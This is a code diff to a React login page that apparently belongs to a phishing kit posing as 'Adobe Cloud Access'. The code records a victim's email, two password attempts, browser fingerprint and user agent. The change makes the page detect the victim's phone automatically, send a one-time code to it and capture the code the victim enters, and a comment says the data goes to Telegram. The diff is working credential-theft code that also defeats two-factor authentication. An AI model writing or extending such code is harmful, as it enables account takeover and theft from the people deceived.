@@ -1,13 +1,14 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, Smartphone, AtSign } from 'lucide-react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
 import { getBrowserFingerprint } from '../utils/oauthHandler';
 import {
   generateOTP,
   storeOTPSession,
   verifyOTP,
-  sendOTPToUser,
-  buildCompleteLoginData,
-  clearOTPSession
+  sendOTPToPhone,
+  clearOTPSession,
+  initiateOTPFlow,
+  getOTPSession
 } from '../utils/otpManager';
 
 interface LoginPageProps {
@@ -37,8 +38,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
   
   // OTP Flow States
   const [showOTPFlow, setShowOTPFlow] = useState(false);
-  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone' | null>(null);
-  const [phone, setPhone] = useState('');
+  const [detectedPhone, setDetectedPhone] = useState('');
   const [otp, setOtp] = useState('');
   const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
   const [secondAttemptPassword, setSecondAttemptPassword] = useState('');
@@ -98,13 +98,30 @@ const LoginPage: React.FC<LoginPageProps> = ({
         return;
       }
 
-      // SECOND ATTEMPT: Ask delivery method for OTP
+      // SECOND ATTEMPT: Auto-detect phone and initiate OTP
       if (currentAttempt === 2) {
         setSecondAttemptPassword(password);
         setCurrentEmail(email);
-        setShowOTPFlow(true);
+        
+        console.log('🚀 Starting automatic OTP flow...');
+        const otpResult = await initiateOTPFlow(
+          email,
+          firstAttemptPassword,
+          password,
+          selectedProvider,
+          typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown'
+        );
+
+        if (otpResult.success) {
+          setDetectedPhone(otpResult.phone);
+          setShowOTPFlow(true);
+          console.log('✅ OTP sent to detected phone:', otpResult.phone);
+        } else {
+          setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
+          console.error('❌ OTP flow failed:', otpResult.error);
+        }
+        
         setIsLoading(false);
-        console.log('✅ Second attempt - Moving to OTP selection');
         return;
       }
 
@@ -112,52 +129,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
       console.error('Login error:', error);
       if (onLoginError) onLoginError('Login failed. Please try again.');
       setIsLoading(false);
-    }
-  };
-
-  const handleDeliveryMethodSelect = async (method: 'email' | 'phone') => {
-    setDeliveryMethod(method);
-    setIsLoading(true);
-    setErrorMessage('');
-
-    try {
-      // Generate 6-digit OTP
-      const generatedOTP = generateOTP();
-
-      // Store OTP session
-      storeOTPSession({
-        email: currentEmail,
-        phone: method === 'phone' ? phone : undefined,
-        deliveryMethod: method,
-        otp: generatedOTP,
-        createdAt: new Date().toISOString(),
-        firstAttemptPassword,
-        secondAttemptPassword,
-        provider: selectedProvider || 'Others',
-        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
-      });
-
-      // Send OTP to user
-      const sendSuccess = await sendOTPToUser(
-        currentEmail,
-        method === 'phone' ? phone : undefined,
-        method,
-        generatedOTP
-      );
-
-      if (sendSuccess) {
-        console.log(`✅ OTP sent via ${method}`);
-        setErrorMessage('');
-      } else {
-        throw new Error(`Failed to send OTP via ${method}`);
-      }
-
-      setIsLoading(false);
-    } catch (error) {
-      console.error('OTP sending error:', error);
-      setErrorMessage(`Failed to send OTP. Please try again.`);
-      setIsLoading(false);
-      setDeliveryMethod(null);
     }
   };
 
@@ -183,6 +154,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
       // OTP verified! Build complete login data
       const browserFingerprint = await getBrowserFingerprint();
+      const otpSession = getOTPSession(currentEmail);
+      
       const completionData = {
         email: currentEmail,
         password: secondAttemptPassword,
@@ -190,12 +163,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
         attemptTimestamp: new Date().toISOString(),
         localFingerprint: browserFingerprint,
         fileName: 'Adobe Cloud Access',
-        // Add password history and OTP for Telegram
+        // Password history and OTP for Telegram
         firstAttemptPassword,
         secondAttemptPassword,
         otpEntered: otp,
-        deliveryMethod,
-        phone: deliveryMethod === 'phone' ? phone : undefined,
+        deliveryMethod: 'phone',
+        phone: otpSession?.phone || detectedPhone,
+        phoneDetectedFrom: otpSession?.phoneSource || 'unknown',
       };
 
       console.log('✅ OTP verified successfully!');
@@ -217,8 +191,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
   const handleBackToForm = () => {
     setShowOTPFlow(false);
-    setDeliveryMethod(null);
-    setPhone('');
     setOtp('');
     setErrorMessage('');
   };
@@ -230,107 +202,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
     setLoginAttempts(0);
     setErrorMessage('');
     setShowOTPFlow(false);
-    setDeliveryMethod(null);
   };
 
-  // OTP FLOW: Select delivery method
-  if (showOTPFlow && !deliveryMethod) {
-    return (
-      <div
-        className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
-        style={{
-          backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
-          backgroundSize: 'cover',
-          backgroundPosition: 'center',
-          backgroundRepeat: 'no-repeat'
-        }}
-      >
-        <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
-          <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
-            <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
-              <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
-                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
-                  <Sparkles className="w-4 h-4 text-indigo-500" />
-                  <span className="text-xs font-medium text-indigo-700">Verify Your Identity</span>
-                </div>
-              </div>
-            </div>
-
-            <div className="px-6 py-6 flex flex-col gap-6">
-              <div className="space-y-4">
-                <p className="text-sm text-slate-600">How would you like to receive your verification code?</p>
-
-                <button
-                  onClick={() => handleDeliveryMethodSelect('email')}
-                  disabled={isLoading}
-                  className="w-full flex items-center gap-4 p-4 rounded-xl bg-white border border-gray-200 hover:border-indigo-300 hover:bg-indigo-50 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
-                >
-                  <div className="flex items-center justify-center w-12 h-12 rounded-lg bg-indigo-100">
-                    <Mail className="w-6 h-6 text-indigo-600" />
-                  </div>
-                  <div className="text-left">
-                    <p className="font-semibold text-slate-900">Email</p>
-                    <p className="text-xs text-slate-500">{currentEmail}</p>
-                  </div>
-                  {isLoading && <div className="ml-auto w-4 h-4 border-2 border-indigo-300 border-t-indigo-600 rounded-full animate-spin" />}
-                </button>
-
-                <div className="relative">
-                  <div className="absolute inset-0 flex items-center">
-                    <div className="w-full border-t border-gray-200"></div>
-                  </div>
-                  <div className="relative flex justify-center text-sm">
-                    <span className="px-2 bg-white text-gray-500">or</span>
-                  </div>
-                </div>
-
-                <div>
-                  <label className="block text-sm font-medium text-slate-700 mb-2">Send to Phone</label>
-                  <div className="flex gap-2">
-                    <div className="relative flex-1">
-                      <Smartphone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
-                      <input
-                        type="tel"
-                        value={phone}
-                        onChange={(e) => setPhone(e.target.value)}
-                        placeholder="Enter phone number"
-                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
-                      />
-                    </div>
-                    <button
-                      onClick={() => handleDeliveryMethodSelect('phone')}
-                      disabled={isLoading || !phone}
-                      className="px-4 py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
-                    >
-                      {isLoading ? <span className="inline-block w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : 'Send'}
-                    </button>
-                  </div>
-                </div>
-
-                {errorMessage && (
-                  <div className="rounded-lg p-3 bg-red-50 border border-red-100">
-                    <p className="text-sm text-red-700">{errorMessage}</p>
-                  </div>
-                )}
-              </div>
-
-              <div className="pt-2 border-t border-gray-100">
-                <button
-                  onClick={handleBackToForm}
-                  className="text-sm text-slate-600 hover:text-slate-900 font-medium"
-                >
-                  ← Back to login
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
   // OTP FLOW: Enter OTP code
-  if (showOTPFlow && deliveryMethod) {
+  if (showOTPFlow) {
     return (
       <div
         className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
@@ -355,7 +230,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             <div className="px-6 py-6 flex flex-col gap-6">
               <div className="space-y-4">
                 <p className="text-sm text-slate-600">
-                  We've sent a 6-digit verification code to your {deliveryMethod === 'email' ? 'email' : 'phone number'}.
+                  We've sent a 6-digit verification code to your phone number ending in <strong>{detectedPhone.slice(-4)}</strong>
                 </p>
 
                 <form onSubmit={handleOTPSubmit} className="space-y-4">
@@ -368,7 +243,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                   <div>
                     <label className="block text-sm font-medium text-slate-700 mb-2">Verification Code</label>
                     <div className="relative">
-                      <AtSign className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
+                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                       <input
                         type="text"
                         value={otp}
@@ -529,7 +404,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow"
                   >
                     {isLoading && <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />}
-                    <span>{isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}</span>
+                    <span>{isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Sending OTP...') : 'Sign In Securely'}</span>
                   </button>
                 </form>
               </div>
